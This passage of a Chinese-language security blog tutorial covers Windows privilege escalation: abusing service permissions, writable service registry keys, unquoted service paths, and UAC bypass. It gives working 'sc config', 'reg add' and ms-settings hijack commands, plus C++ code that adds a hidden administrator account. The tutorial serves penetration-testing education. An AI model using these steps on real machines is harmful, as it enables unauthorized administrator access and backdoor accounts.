<li>SACL（系统访问控制列表）是安全主体对安全对象的放文行为的审计策略。而SACL中的ACE会对<code>安全主体</code>的一些访问进行日志记录，当安全主体的访问满足ACE时就会被记录在日志文件中。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="不安全的服务权限" class="heading-element"><span>不安全的服务权限</span>
  <a href="#%e4%b8%8d%e5%ae%89%e5%85%a8%e7%9a%84%e6%9c%8d%e5%8a%a1%e6%9d%83%e9%99%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>在上文中我们介绍了ACL，而ACL中的各种ACE定义了<code>安全对象</code>的访问控制策略。而Windows也正是通过ACL来确定用户对其拥有什么样的权限，具体权限如下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">权限</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">SERVICE_START</td>
<td style="text-align:center">启动服务的权限</td>
</tr>
<tr>
<td style="text-align:center">SERVICE_STOP</td>
<td style="text-align:center">停止服务的权限</td>
</tr>
<tr>
<td style="text-align:center">SERVICE_PAUSE_CONTINUE</td>
<td style="text-align:center">暂停或继续运行的权限</td>
</tr>
<tr>
<td style="text-align:center">SERVICE_QUERY_STATUS</td>
<td style="text-align:center">查询服务状态的权限</td>
</tr>
<tr>
<td style="text-align:center">SERVICE_QUERY_CONFIG</td>
<td style="text-align:center">查询服务配置的权限</td>
</tr>
<tr>
<td style="text-align:center">SERVICE_CHANGE_CONFIG</td>
<td style="text-align:center">更改服务配置的权限</td>
</tr>
<tr>
<td style="text-align:center">SERVICE_ALL_ACCESS</td>
<td style="text-align:center">完全控制权限</td>
</tr>
</tbody>
</table>
<p>如果目标主机的服务配置存在问题，那么==低权限用户就可以修改以高权限运行的系统服务的配置文件==，那么就可以修改这个系统服务启动时的二进制文件，将其替换成测试人员的木马就可以进行提权。例如：<strong>SERVICE_QUERY_CONFIG</strong>和<strong>SERVICE_ALL_ACCESS</strong>。</p>
<p>那我们怎么才能知道哪些服务存在这样的缺陷呢？我们可以利用一款工具——AccessChk。</p>
<p>AccessChk是微软官方提供的一个管理工具，常用来查看系统中指定用户、组或者一些特定资源的访问权限。</p>
<p>在测试时可以检查“Authenticated Users（经过身份验证的用户）”组和“INTERACTIVE（交互式用户）”组对系统服务的权限。</p>
<ol>
<li>
<p>执行以下命令 来枚举目标主机中“Authenticated Users”组是否具有更改服务配置的权限。</p>
<pre tabindex="0"><code>accesschk.exe /accepteula -uwcqv &#34;Authenticated Users&#34; *</code></pre></li>
<li>
<p>在找到缺陷后，执行以下命令上传payload。当服务重启时，payload会以高权限启动。</p>
<pre tabindex="0"><code>sc config 服务名称 binpath= &#34;cmd.exe&#34;
# binpath，指定服务的二进制文件路径，在“=”之后必须跟一个空格</code></pre></li>
<li>
<p>完成以上的步骤就对服务的二进制文件进行了替换，接下来的工作就是需要将<strong>服务重启</strong>。</p>
<p>这里有两个思路，如果当前用户对服务拥有<code>SERVICE_STOP</code>和<code>SERVICE_STOP</code>权限，可以通过以下命令重启服务</p>
<pre tabindex="0"><code>sc stop 服务名称
sc start 服务名称</code></pre><p>如果没有以上两个权限，可以直接将目标主机重启来模拟服务重启的过程。</p>
</li>
</ol>
<h2 id="服务注册表权限可控" class="heading-element"><span>服务注册表权限可控</span>
  <a href="#%e6%9c%8d%e5%8a%a1%e6%b3%a8%e5%86%8c%e8%a1%a8%e6%9d%83%e9%99%90%e5%8f%af%e6%8e%a7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p>Windows中的注册表记录了每个系统服务的一些具体条目，而注册表也会有一些<code>ACL</code>对其防护，以此来确定用户对注册表是否有其该拥有的访问权限。但如果注册表的ACL配置出错，那么就可以使一个低权限用户，对注册表拥有写入权限，从而进行修改ImagePath二进制文件路径，以此来达到提权的目的。</p>
</blockquote>
<ol>
<li>
<p>执行以下命令可以查看在Windows中“Authenticated Users”用户组对于哪些系统服务拥有写入权限</p>
<pre tabindex="0"><code>accesschk.exe /accepteula -uvwqk &#34;Authenticated Users&#34; HKLM\SYSTEM\CurrentControlSet\Services</code></pre></li>
<li>
<p>如果存在的话，可以将payload的路径上传至该服务的ImagePath键值</p>
<pre tabindex="0"><code>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\服务名称 /v ImagePath /t REG_EXPAND_SZ /d &#34;cmd.exe&#34;</code></pre></li>
</ol>
<h2 id="未引用的服务路径" class="heading-element"><span>未引用的服务路径</span>
  <a href="#%e6%9c%aa%e5%bc%95%e7%94%a8%e7%9a%84%e6%9c%8d%e5%8a%a1%e8%b7%af%e5%be%84" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p>未引用的服务路径（Unquoted Service Path）漏洞也被称为<code>可信任的服务路径</code>（Trusted Service Path），它利用了Windows的文件解析路径的特性。当文件路径中含有<strong>空格</strong>时就会触发该漏洞。</p>
</blockquote>
<p>简单来说，在Windows当中如果引用的完整路径中含有空格但是没有有效的引号所将其引起来的话，那么对于该路径中的每一个空格，Windows都会按照从左至右的顺序<code>依次</code>寻找并<code>执行</code>与空格前名字相匹配的程序。</p>
<p>我们来简单的举个例子：路径：<strong>C:\Program Files\Sublime Text 3\Sublime Text.exe</strong>，系统会依次执行下述程序：</p>
<ul>
<li>C:\Program.exe</li>
<li>C:\Program Files\Sublime.exe</li>
<li>C:\Program Files\Sublime Text 3\Sublime.exe</li>
<li>C:\Program Files\Sublime Text 3\Sublime Text.exe</li>
</ul>
<p>我们可以将payload上传至上述路径中，在系统依次调用时会执行我们所上传的payload，从而达到提权的目的。<strong>当然此方法的执行前提是，用户对以上可能存在路径拥有写入权限</strong>。</p>
<h1 id="bypassuac" class="heading-element"><span>BypassUAC</span>
  <a href="#bypassuac" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p><code>用户账户控制</code><em>UAC</em>是微软公司在Windows Vista及更高版本的操作系统中所采用的一种控制机制，可以阻止自动安装未经授权的应用并防止意外更改系统设置。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序损坏系统效果。</p>
<p>使用<code>UAC</code>可以使==应用程序和任务总是在非管理员账户的安全上下文中运行==，但管理员专门给系统授予管理员级别的访问权限时除外。<code>UAC</code>会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。</p>
<p><code>UAC</code>限制所有用户包括非RID500的管理员用户（<strong>只有Administrator用户的RID为500</strong>）使用标准用户登录到他们的计算机，并在标准用户的安全性上下文中访问资源和运行应用。</p>
<p>当非<code>RID500</code>的管理员用户登录后，系统会为其创建两个单独的访问令牌——标准用户访问令牌和管理员访问令牌。标准用户访问令牌与管理员访问令牌相比只是移除了SID以及Windows管理特权，标准用户访问令牌只是用来启动一些不需要用到管理员权限所启动的程序，只有当需要用管理员权限启动一些更高级的服务时，才会用到管理员访问令牌来进行启动。</p>
<p>在渗透测试中，测试人员可以通过绕过<code>UAC</code>机制，==使得非RID500的用户不通过批准可以直接使用管理员访问令牌，从而就可以获取管理员的管理权限==。</p>
<p><strong>这只是一种绕过机制，并不是真正的提权！！</strong></p>
<h3 id="uac白名单" class="heading-element"><span>UAC白名单</span>
  <a href="#uac%e7%99%bd%e5%90%8d%e5%8d%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>微软在用户<code>UAC</code>中为一些系统程序设置了白名单机制，所有白名单中的程序在需要管理员权限运行时，都不会再询问，而是以静默的方式自动提升到管理员权限运行。依照这一机制，我们可以对白名单内的程序采用dll注入、dll劫持或者注册表劫持，来绕过UAC。</p>
<p>注意</p>
<p>依照上文我们所说的方法，那么我们所要做的第一步就是要找到哪些程序位于UAC白名单之中。</p>
<p>可以通过微软的官方工具<strong>Sigcheck</strong>和<strong>Strings</strong>，来进行查找。</p>
<p>位于UAC白名单中的程序有一个特点，就是<code>Manifest</code>数据中的<code>autoElevate</code>属性的值为<strong>True</strong>。</p>
<ul>
<li><strong>Signcheck</strong>可以检测程序是否具有autoElevate属性。</li>
</ul>
<blockquote>
<p>下载地址：<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck"target="_blank" rel="external nofollow noopener noreferrer">Sigcheck - Sysinternals | Microsoft Learn</a></p>
</blockquote>
<p>以下图为例，位于**C:/windows/system32/**的<code>computerdefaults.exe</code>是一个白名单程序，我们可以使用命令：</p>
<pre tabindex="0"><code>sigcheck.exe /accepteula -m 路径</code></pre><ul>
<li>Strings可以找出所有具有autoElevare属性的程序</li>
</ul>
<p>使用命令：<code>strings.exe /accepteula -s C:\windows\system32\*.exe | findstr /i &quot;autoElevate&quot;</code></p>
<p>在找到具有autoElevare属性的程序后，我们可以通过一些别的手段来达到绕过UAC的目的。</p>
<p>Tip</p>
<p>在这里我们以上文提到的ComputerDefaults.exe为例，来为各位简单介绍一下。</p>
<ol>
<li>
<p>我们首先到C:\Windows\System32下找到ComputerDefaults.exe这个程序，</p>
</li>
<li>
<p>双击运行，</p>
</li>
<li>
<p>会发现直接打开了设置中的“默认应用”界面，而并没有触发UAC保护机制。</p>
<ol>
<li>
<p>然后我们使用进程监视器ProcessMoniotr，来对ComputerDefaults.exe进程的所有操作行为进行监控。可以发现，ComputerDefaults.exe会先查询注册表<code>HKCU\Software\Classes\ms-settings\shell\open\command</code>中的数据，发现该路径不存在后，继续查询注册表<code>HKCR\ms-settings\Shell\Open\Command\DelegateExecute</code>中的数据并读取。</p>
<p>一般以&quot;<code>shell\open\command</code>“命名的注册表中存储的一般都是可执行文件的路径，程序会读取其中的键值来获取相应可执行文件的路径，并进一步运行该键值所指明的可执行文件。但是由于ComputerDefaults.exe属于UAC白名单程序，所以在运行ComputerDefautls.exe时会默认已管理员权限运行，而其所调用的<strong>注册表中的可执行文件</strong>也会已管理员权限运行。</p>
</li>
<li>
<p>执行以下命令</p>
<pre tabindex="0"><code>reg add &#34;HKCU\Software\Classes\ms-settings\shell\open\command&#34; /d &#34;C:\Windows\System32\add_user.exe&#34; /f

reg add &#34;HKCU\Software\Classes\ms-setting\shell\open\command&#34; /v DelegateExecute /t REG_SZ /d &#34;C:/Windows\System32\add_user.exe&#34; /f</code></pre><p>解释一下👆两条命令的意思：<strong>在注册表<code>HKCU\Software\Classes\ms-settings\shell\open\command</code>（如果没有就创建）中将要执行的payload分别写入“默认值”和“DelegateExecute值”，（*在上面的命令中写入的路径为：C:\Windows\System32\add_user.exe*）。</strong></p>
<p>以下为cmd.cpp的源代码,意在创建一个账户名为hack，密码为hack的账户，并将其添加至Administrators组中。</p>
<pre tabindex="0"><code>#include&lt;iostream&gt;
#include&lt;windows.h&gt;
#include&lt;cstdio&gt;
using namespace std;
int main()
{
	system(&#34;net user hack hack /add&#34;);
	system(&#34;net localgroup administrators hack /add&#34;);
	return 0;
 } </code></pre><p>下图以标准用户权限执行，因为<strong>标准用户对该注册表拥有修改键值权限</strong>。</p>
<p>然后再次执行ComputerDefautls.exe之后，我们所创建的恶意程序也会已管理员权限执行。按照我们上文所放置的恶意程序，在执行之后，会新增一个具有管理员权限名为<strong>hack</strong>的用户。</p>
</li>
</ol>
</li>
</ol>
<p>如果在注册表键值处修改成<code>C:/Windows\System32\cmd.exe</code>，那么再重新启动ComputerDefaults.exe时会重新打开一个拥有管理权权限的cmd。</p>
<h3 id="dll劫持" class="heading-element"><span>DLL劫持</span>
  <a href="#dll%e5%8a%ab%e6%8c%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><blockquote>
<p>在Windows中我们使用的最多的一种文件，是以.exe为后缀的可执行文件，但大多数情况下，很多应用程序并不是一个完整的可执行文件，而是被分割成一些相对独立的动态链接库（<code>Dynamic Link Library，DLL</code>）文件，而dll文件中通常会包括一些程序运行所需要使用的代码和数据。当我们所使用的应用程序启动时，程序运行所需的dll文件就会被加载到程序进程的内存空间中。而测试人员可以通过一些手段，在某些应用程序启动时加载恶意的dll文件。以上这整个行为就被称为：<strong>DLL劫持</strong></p>
</blockquote>
<p>当应用程序需要加载dll文件时，如果没有指定给出相应的dll文件的绝对位置，那么程序将会以一种特定的方式顺序依次在指定路径下搜索等待加载的dll文件。在开启<code>安全DLL搜索模式（SafeDllSearchMode，windowsXP SP2后默认开启）</code>，将按照以下方式搜索：</p>
<p>程序安装目录➡️系统目录(C:\windows\system32)➡️16位系统目录(C:\windows\system)➡️Windows目录(C:\Windows)➡️当前工作目录➡️PATH环境变量中列出的各个目录</p>
<p>如果我们将恶意的dll文件名替换成合法的dll文件名，并将其放在之前合法的dll文件处，在应用程序重新加载dll文件时，就会触发我们放置好的恶意dll文件，放置恶意dll文件的前提是<strong>对上述目录有写入权限</strong>，<strong>并且恶意dll文件与原始合法dll文件具有相同的导出表函数</strong>。<strong>这就是dll预加载劫持情景</strong>。</p>
<h3 id="模拟可信任目录" class="heading-element"><span>模拟可信任目录</span>
  <a href="#%e6%a8%a1%e6%8b%9f%e5%8f%af%e4%bf%a1%e4%bb%bb%e7%9b%ae%e5%bd%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><blockquote>
<p>我们在上文中提到UAC白名单程序是一种可以不显示询问弹窗，就可以自动提升权限的应用程序，白名单程序有一个共同的特性就是Mainfest中autoElevate属性值为True。</p>
</blockquote>
<p>当启动的程序需要使用管理员权限时，系统会先读取可执行文件的Mainfest信息，获取其autoElevate属性值是否为True，如果是True，则会认为这是一个可自动提升权限的可执行文件。同时，系统也会检查可执行文件的签名，因此无法通过伪造Mainfest信息来伪造UAC白名单程序。除此之外，系统还会检查该可执行文件是否位于系统可信任目录中，比如<code>C:\windows\system32</code>目录中。当这三个条件全都吻合后，才会自动将可执行文件以高权限执行。</p>
<p>在系统检查可信任目录时，相关的系统函数会自动去掉可执行文件路径中的空格。</p>
<p>举例：如果一个可执行文件位于<code>C:\Windows \system32</code>目录中（在Windows后有一空格），系统会在检查是否好时可信任目录时去掉空格，就会将路径变为<code>C:\Windows\system32</code>（在Windows后没有空格了），这样就绕过了可信任目录的检查。</p>
<p>基于这个原理，测试人员可以依照所知的可信任目录，来模拟创建一个假的可信任目录（在某些地方以空格填充），将一个白名单程序复制到我们所创建的模拟可信任目录中，配合DLL劫持等技术，即可绕过UAC。</p></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E6%8F%90%E6%9D%83/" class="post-tag" title="Tags - 提权">提权</a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag" title="Tags - 内网渗透">内网渗透</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/52/" class="post-nav-item" rel="prev" title="Windows横向移动"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Windows横向移动</a>
      <a href="/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%B3%BB%E7%BB%9F/windows/90/" class="post-nav-item" rel="next" title="Windows常用命令">Windows常用命令<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
<a href="https://statcounter.com/p13160752/?guest=1" target="_blank">访问量统计</a> 

<script type="text/javascript">
var sc_project=13160779;
var sc_invisible=0;
var sc_security="f35eb178";
var scJsHost = "https://";
document.write("<sc"+"ript type='text/javascript' src='" +
scJsHost +
"statcounter.com/counter/counter.js'></"+"script>");
</script>

<noscript>
  <div class="statcounter">
    <a title="web stats" href="https://statcounter.com/" target="_blank">
      <img referrerPolicy="no-referrer-when-downgrade">
    </a>
  </div>
</noscript>


    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
